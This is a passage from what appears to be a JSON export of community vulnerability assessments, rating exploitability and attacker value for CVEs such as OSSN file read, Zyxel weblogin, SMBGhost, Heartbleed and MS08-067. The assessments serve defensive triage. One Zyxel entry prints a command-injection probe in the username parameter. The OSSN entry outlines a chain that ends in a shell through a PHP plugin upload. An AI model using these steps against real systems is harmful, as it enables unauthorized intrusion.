      "document": "This was my first CVE :) \r\n\r\nThis is an Unauthenticated Arbitrary File Read vulnerability in all versions of The Open Source Social Network prior to 5.3 This includes the Open source and commercial versions. \r\n\r\nAttacker value stays low as there is not a large population using this application ~ 500,000 downloads and the first phase of the attack can take several hours.\r\n\r\nPhase 1 You need the Site Key. The site key is cryptographically weak and If you can get any cipher text you can recover the key in less than 14 hours on a standard laptop. \r\nIf you are unable to gain access as a standard user you can get crypto material from other locations but the PoC is designed for the user strings. \r\n\r\nOnce the Site Key has been recovered you can use the python script to read any file (in the context of the application) from disk. This includes database credentials and site configurations that can allow for admin access to the site. From here you can gain a full shell using a PHP plugin upload. \r\n\r\n\r\n\r\nFull details can be found - https://techanarchy.net/pages/blog/cve-2020-10560-ossn-arbitrary-file-read",
      "score": 3,
      "metadata": {
        "tags": [
          "default_configuration",
          "easy_to_develop",
          "pre_auth",
          "no_useful_data"
        ],
        "attacker-value": 1,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "72a56d1a-904e-4e43-9e18-c29222ee60bb",
      "editorId": "2ccacbe6-ae15-400a-8cd0-57acc7fb593c",
      "topicId": "c196a2ca-11b5-4498-b323-5d755c3db615",
      "created": "2020-04-03T13:18:21.103807Z",
      "revisionDate": "2020-04-03T13:18:21.107281Z",
      "document": "Wording on this and eludes to an authenticated RCE, but they consider an anonymous user authenticated. Nexus servers store artifacts that could be altered to pivot elsewhere. This will be a high when POC surfaces, for now I'm going lower. The number of much older versions (that also have vulnerabilities) in shodan suggests many organizations are not keeping up with patching. ",
      "score": 1,
      "metadata": {
        "tags": [
          "common_enterprise",
          "high_privilege_access",
          "pre_auth"
        ],
        "attacker-value": 3,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "82d29a67-1281-4c3e-96bc-f6dc04d78719",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "5796d30a-c555-4f24-9bbf-fe886cd18c56",
      "created": "2020-04-04T05:05:16.145893Z",
      "revisionDate": "2020-04-04T05:05:16.149265Z",
      "document": "WIP exploit module: https://github.com/rapid7/metasploit-framework/pull/13195.",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "9284577d-e22d-4842-b62a-7a330df03f51",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "cea62072-99b0-4c2b-b293-6ac558930860",
      "created": "2020-04-05T01:50:32.702978Z",
      "revisionDate": "2020-04-05T01:53:45.761768Z",
      "document": "Wasn't able to get a test device or emulate the firmware in QEMU, but I did dig into the patch a bit with Ghidra.\r\n\r\n```\r\nwvu@kharak:~/Downloads$ diff <(strings weblogin.cgi.unpatched) <(strings weblogin.cgi.patched)\r\n33a34,39\r\n> libpcre.so.1\r\n> pcre_exec\r\n> pcre_compile\r\n> pcre_free_study\r\n> pcre_study\r\n> pcre_free\r\n65d70\r\n< free\r\n119a125,126\r\n> ^([a-zA-Z]|[a-zA-Z][a-zA-Z0-9._-]|[a-zA-Z][a-zA-Z0-9 ._-]{0,30}[a-zA-Z0-9._-])$\r\n> ^[^!#-&(-]*$\r\nwvu@kharak:~/Downloads$\r\n```\r\n\r\nAnalysis of a patched function (not shown here) indicates Zyxel applied a regex to the username field.\r\n\r\n![](https://i.imgur.com/3T6goYH.png)\r\n\r\nBut it appears they left what appears to be the command injection unfixed.\r\n\r\n```\r\n/cgi-bin/weblogin.cgi?username=admin';echo\r\n```\r\n\r\n`\u00af\\_(\u30c4)_/\u00af`",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "024fe7d5-f8cb-4c44-adb4-109bcbc7a25b",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "3b64b132-1e7a-49bb-a187-96db3b84bd2a",
      "created": "2020-04-08T18:31:56.890164Z",
      "revisionDate": "2023-11-29T10:45:01.670093Z",
      "document": "A Metasploit module has been written: https://github.com/rapid7/metasploit-framework/pull/13213.\r\n\r\n**ETA:** Please see the [Rapid7 analysis](https://attackerkb.com/topics/rXLP28C1nf/cve-2020-7961#rapid7-analysis). CVE-2020-7961 is being used in the \"FreakOut\" attack campaign.",
      "score": 3,
      "metadata": {},
      "tags": []
    },
    {
      "id": "77b2b60b-db15-498c-bdf5-6faf0ee4b3c7",
      "editorId": "7dcb2bba-0893-4a4b-a2c9-152965f852b9",
      "topicId": "b8a2fa01-8796-4335-8bf4-45147e14afc9",
      "created": "2020-04-09T14:08:28.883845Z",
      "revisionDate": "2020-08-18T01:22:02.832096Z",
      "document": "Just to drop in my panicky two cents: Exchange Administrators are historically hesitant to patch Exchange without extensive planning and often physical presence to reboot / restore if needed. Exchange patching isn't usually just a matter of patch, reboot, move on with your life -- many sites need to deprovision an Exchange server to fail over, then again to do it the other way. Even when everything goes well, sometimes the patch doesn't actually apply, which means administrators either don't notice, or actively check and test (which means more time).\r\n\r\nSo, in short, there's a trust gap for this particular patch, and I believe that's what we see reflected in the low patch numbers. Even if the patch is easy and clean and works great, an experienced Exchange admin isn't going to trust it.",
      "score": 3,
      "metadata": {
        "tags": [
          "default_configuration",
          "difficult_to_patch",
          "high_privilege_access",
          "common_enterprise",
          "easy_to_develop",
          "post_auth"
        ],
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "33f9befc-62eb-4911-a089-537fe38b8b91",
      "editorId": "8deaf797-2af1-4bd1-aea1-98640b61deda",
      "topicId": "748ab553-1074-4fc0-9f1f-595ada4479a6",
      "created": "2020-04-09T20:58:28.597583Z",
      "revisionDate": "2020-04-22T17:47:08.278836Z",
      "document": "Because the SSH key was published, this becomes a quick win for an attacker who encounters this service running with the default key in place. The mitigation would require easy steps, but the affected party might not even know they are vulnerable.",
      "score": 2,
      "metadata": {
        "tags": [
          "default_configuration",
          "high_privilege_access",
          "easy_to_develop"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "6044112a-8b4f-4b1c-918b-812c5719c377",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "89614a4c-22a0-4b16-9d34-795659fb97ba",
      "created": "2020-04-10T13:12:22.270151Z",
      "revisionDate": "2020-04-10T13:12:22.26941Z",
      "document": "Another in the long line of speculative side-channel attacks, this increases the effectiveness of existing attacks, but is also disabled by similar mitigations. Unlikely to be used in any practical way by an attacker, there are many more sources of low-hanging fruit.",
      "score": 1,
      "metadata": {
        "tags": [
          "no_useful_data",
          "common_enterprise",
          "difficult_to_exploit"
        ],
        "attacker-value": 1,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        },
        {
          "id": "17fdfb85-8dfd-4dbf-bd2b-7cd032026885",
          "name": "Requires physical access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_exploit"
        }
      ]
    },
    {
      "id": "5e790607-d122-4e81-9e26-f51180fc85d0",
      "editorId": "070816c2-96a2-431d-9254-212d36afcea9",
      "topicId": "32199b9a-1ebf-4ab7-b8ce-4c78f71a2700",
      "created": "2020-04-10T15:04:40.859262Z",
      "revisionDate": "2020-04-10T15:04:40.861241Z",
      "document": "# CVE-2020-1984 Secdo: Privilege escalation via hardcoded script path\r\n\r\nAttack Vector LOCAL\r\nAttack Complexity LOW\r\nPrivileges Required LOW\r\nUser Interaction NONE\r\nScope UNCHANGED\r\nConfidentiality Impact HIGH\r\nIntegrity Impact HIGH\r\nAvailability Impact HIGH\r\n\r\n## Description\r\nSecdo tries to execute a script at a hardcoded path if present, which allows a local authenticated user with 'create folders or append data' access to the root of the OS disk (C:\\) to gain system privileges if the path does not already exist or is writable.\r\n\r\n## Product Status\r\nSecdo\r\nVersions\tAffected\r\nall versions on Windows\t\r\nSeverity: HIGH\r\nCVSSv3.1 Base Score: 7.8 (CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)\r\n\r\n## Solution\r\nThis product is no longer supported and the issue is not going to be fixed. The issue can be completely mitigated by ensuring that unprivileged users do not have 'create folder' access on the root of the filesystem such as C:\\ or on a folder named C:\\Common.\r\n\r\n##Workarounds and Mitigations\r\nThis issue can be mitigated by :\r\n\r\n- Ensure unprivileged users do not have 'create folder' access on the root of filesystem such as C:\\.\r\n\r\nor\r\n\r\n- Creating a folder named C:\\Common and ensuring unprivileged users do not have 'create folder' access.\r\n\r\n## Acknowledgements\r\nWe like to thank Eviatar Gerzi of CyberArk Labs Team for discovering and reporting this issue.\r\n\r\nhttps://security.paloaltonetworks.com/CVE-2020-1984",
      "score": 1,
      "metadata": {
        "tags": [
          "high_privilege_access",
          "post_auth",
          "easy_to_develop",
          "difficult_to_patch",
          "default_configuration"
        ],
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "b0917bc3-a682-4c2f-b77f-6d17104688d1",
      "editorId": "070816c2-96a2-431d-9254-212d36afcea9",
      "topicId": "2c1cba13-9b0e-4056-91b0-24475c6c19dc",
      "created": "2020-04-10T15:06:16.869063Z",
      "revisionDate": "2020-04-10T15:06:16.870093Z",
      "document": "# CVE-2020-1985 Secdo: Incorrect Default Permissions\r\n\r\nAttack Vector LOCAL\r\nAttack Complexity LOW\r\nPrivileges Required LOW\r\nUser Interaction NONE\r\nScope UNCHANGED\r\nConfidentiality Impact HIGH\r\nIntegrity Impact HIGH\r\nAvailability Impact HIGH\r\n\r\n## Description\r\nIncorrect Default Permissions on C:\\Programdata\\Secdo\\Logs folder in Secdo allows local authenticated users to overwrite system files and gain escalated privileges. This issue affects all versions Secdo for Windows.\r\n\r\nProduct Status\r\nSecdo\r\nVersions\tAffected\r\nall versions on Windows\t\r\nSeverity: HIGH\r\nCVSSv3.1 Base Score: 7.8 (CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)\r\n\r\n## Solution\r\nThis product is no longer supported and the issue will not be fixed. Change permission on C:\\Programdata\\Secdo\\Logs folder to not allow unprivileged users access.\r\n\r\n## Workarounds and Mitigations\r\nChange permission on C:\\Programdata\\Secdo\\Logs to not allow unprivileged users access.\r\n\r\n## Acknowledgements\r\nWe like to thank Eviatar Gerzi of CyberArk Labs Team for discovering and reporting this issue.\r\n\r\nhttps://security.paloaltonetworks.com/CVE-2020-1985",
      "score": 1,
      "metadata": {
        "tags": [
          "difficult_to_patch",
          "high_privilege_access",
          "post_auth",
          "default_configuration",
          "easy_to_develop"
        ],
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "703121bc-0659-4226-9354-63debbb29c62",
      "editorId": "070816c2-96a2-431d-9254-212d36afcea9",
      "topicId": "60e90709-4dc6-48f7-ae55-5a400e1eeb4e",
      "created": "2020-04-10T15:07:45.202985Z",
      "revisionDate": "2020-04-10T15:07:45.204426Z",
      "document": "# CVE-2020-1986 Secdo: Local authenticated users can cause Windows system crash\r\n\r\nAttack Vector LOCAL\r\nAttack Complexity LOW\r\nPrivileges Required LOW\r\nUser Interaction NONE\r\nScope UNCHANGED\r\nConfidentiality Impact NONE\r\nIntegrity Impact NONE\r\nAvailability Impact HIGH\r\n\r\n## Description\r\nImproper input validation vulnerability in Secdo allows an authenticated local user with 'create folders or append data' access to the root of the OS disk (C:\\) to cause a system crash on every login. This issue affects all versions Secdo for Windows.\r\n\r\nProduct Status\r\nSecdo\r\nVersions\tAffected\r\nall versions on Windows\t\r\nSeverity: MEDIUM\r\nCVSSv3.1 Base Score: 5.5 (CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H)\r\n\r\n## Solution\r\nThis product is no longer supported and the issue will not be fixed. This issue can be easily mitigated by creating a \"C:\\proc\" folder and not allowing unprivileged users to access to that folder, or ensuring unprivileged users do not have 'create folder' access to the root of a disk (C:\\).\r\n\r\n## Workarounds and Mitigations\r\nExploitation of this issue can be prevented by creating a \"C:\\proc\" folder and not allowing unprivileged users to access that folder.\r\n\r\n## Acknowledgements\r\nWe like to thank Eviatar Gerzi of CyberArk Labs Team for discovering and reporting this issue.\r\n\r\nhttps://security.paloaltonetworks.com/CVE-2020-1986",
      "score": 1,
      "metadata": {
        "tags": [
          "easy_to_develop",
          "no_useful_data",
          "default_configuration",
          "post_auth",
          "difficult_to_patch"
        ],
        "attacker-value": 2,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "5b659f15-ea72-426c-9e56-65793361f253",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "b42ac919-79f8-43f3-a20e-e7943c97c535",
      "created": "2020-04-10T16:34:02.701519Z",
      "revisionDate": "2020-04-10T16:34:02.703194Z",
      "document": "This vulnerability is a Use-After-Free in the Microsoft VBScript engine. Originally exploited in the wild, attackers used a technique to force the exploit code to be opened with Internet Explorer by embedding a resource into a Rich Text File (RTF). This technique would allow attackers to more reliably exploit targets, even when a non-IE browser was configured as the default.\r\n\r\nThe Use After Free is related to arbitrary VB object. When two arrays reference the same object, and one array is deleted, the second array is left with a dangling reference.",
      "score": 1,
      "metadata": {
        "tags": [
          "default_configuration",
          "pre_auth",
          "requires_interaction",
          "common_enterprise"
        ],
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "8594810a-3757-42b2-a3b7-9e9909fb6b01",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "69b21ddb-9b38-4151-8607-13f22b4d8630",
      "created": "2020-04-10T19:44:52.46893Z",
      "revisionDate": "2020-04-10T19:44:52.468058Z",
      "document": "How do you get someone to autenticate with an untrusted PPPD peer these days? I just don't think the vector for attack is easy for any attacker, and if you are in a position to sit there, like in a DSLAM, you have access to a lot of other evil possibilities.",
      "score": 1,
      "metadata": {
        "tags": [
          "difficult_to_exploit"
        ],
        "attacker-value": 1,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "17fdfb85-8dfd-4dbf-bd2b-7cd032026885",
          "name": "Requires physical access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_exploit"
        }
      ]
    },
    {
      "id": "b374ddf3-3495-4fa5-819d-3bf4d9f6f550",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "6192b97f-fd21-4adf-8ea0-50af97e8a55e",
      "created": "2020-04-10T21:47:10.437706Z",
      "revisionDate": "2020-04-10T21:47:10.460242Z",
      "document": "A vulnerability exists within the SMB service and how it handles compressed data. A specially crafted [`COMPRESSION_TRANSFORM_HEADER`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/1d435f21-9a21-4f4c-828e-624a176cf2a0) (and related structures defined in 2.2.42 subsections) can be used to trigger an out of bounds write operation. This vulnerability can be triggered pre-auth on unpatched systems with a default configuration. Microsoft announced that Compression could be disabled through re-configuring the SMB service as a temporary fix before a patch was made available.\r\n\r\nExploitation of this vulnerability is non-trivial due to the difficulty of determining the memory layout necessary for successfully leveraging this class of vulnerability. It is however trivial to create a PoC that would trigger the vulnerable code path, causing an exception to be raised within the service.",
      "score": 1,
      "metadata": {
        "tags": [
          "pre_auth",
          "high_privilege_access",
          "common_enterprise",
          "default_configuration",
          "difficult_to_develop"
        ],
        "attacker-value": 5,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "bb222ed6-8a86-4918-9011-bc69801f4fe8",
      "editorId": "2e32f38d-bd27-42ec-9a3b-e7b58a5aa507",
      "topicId": "445f1cac-c379-466a-ab3a-36c33d2aa1f5",
      "created": "2020-04-11T16:59:55.761802Z",
      "revisionDate": "2020-04-13T07:38:16.12172Z",
      "document": "MS08-067 was possibly the most popular vulnerability of the 2000s. It allows remote code execution, pre-authentication, against all default Windows operating system configurations of the time. While SMB, should never be exposed on the Internet, once on the internal network, almost all windows systems have it enabled.\r\n\r\nExploitation is trivial (point and shoot) through metasploit: https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi\r\n\r\nThis exploit was widely used and most notably known for the Conficker worm: https://en.wikipedia.org/wiki/Conficker",
      "score": 2,
      "metadata": {
        "tags": [
          "pre_auth",
          "high_privilege_access",
          "default_configuration",
          "common_enterprise",
          "easy_to_develop"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "dcf7f17c-0764-4f46-9e0a-86699e27649f",
      "editorId": "6d00a11d-d7a6-4e98-a7ed-834b16d67594",
      "topicId": "6192b97f-fd21-4adf-8ea0-50af97e8a55e",
      "created": "2020-04-13T15:33:05.040502Z",
      "revisionDate": "2020-04-13T15:33:05.042356Z",
      "document": "test",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": []
    },
    {
      "id": "1b69c242-cc15-485c-ade8-d3e500d32b71",
      "editorId": "8862fae2-43c5-4e0a-8583-3c7ee032cf3e",
      "topicId": "6192b97f-fd21-4adf-8ea0-50af97e8a55e",
      "created": "2020-04-13T15:33:39.088469Z",
      "revisionDate": "2020-04-13T15:33:39.090471Z",
      "document": "test",
      "score": 1,
      "metadata": {
        "tags": [
          "easy_to_develop"
        ]
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        }
      ]
    },
    {
      "id": "e47f9fe5-1dcf-4cf6-88d0-8a1778874127",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "d165638b-97c5-4c99-bfa0-70576db52324",
      "created": "2020-04-13T20:54:46.170946Z",
      "revisionDate": "2020-04-15T16:04:51.496371Z",
      "document": "A missing boundary check causes versions of OpenSSL 1.0.1 - 1.0.1f to be vulnerable to an out of bounds read as part of an SSL Heartbeat message. This vulnerability can be leveraged without authenticating in many instances to leak sensitive information such as passwords and private keys. Due to the vulnerability being in the OpenSSL library, exploits are implementation specific and may require changes to implement the applicable protocol.\r\n\r\nThe vulnerability was fixed in [this](https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=96db902) patch.",
      "score": 4,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration",
          "easy_to_develop",
          "pre_auth"
        ],
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "f6eac3db-fc04-4ce9-a1ce-d2aeafbab7c7",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "fde8d754-6f5a-433e-9aba-24238d2deef9",
      "created": "2020-04-13T21:29:02.18337Z",
      "revisionDate": "2020-04-13T21:59:26.7108Z",
      "document": "A use-after-free vulnerability exists within the Microsoft Remote Desktop Protocol stack. The vulnerability is triggered when a T.125 `ConnectMCSPDU` packet's `maxChannelIds` field is less than or equal to 5. This vulnerability can be levered prior to authenticating to the RDP service and can lead to code execution within the context of the Windows Kernel.\r\n\r\nExtensive technical details were published in the [original disclosure](https://www.exploit-db.com/exploits/18606).\r\n\r\nThe major hurdle to reliable code execution is properly grooming the kernel heap.",
      "score": 2,
      "metadata": {
        "tags": [
          "default_configuration",
          "high_privilege_access",
          "pre_auth",
          "common_enterprise",
          "difficult_to_develop"
        ],
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
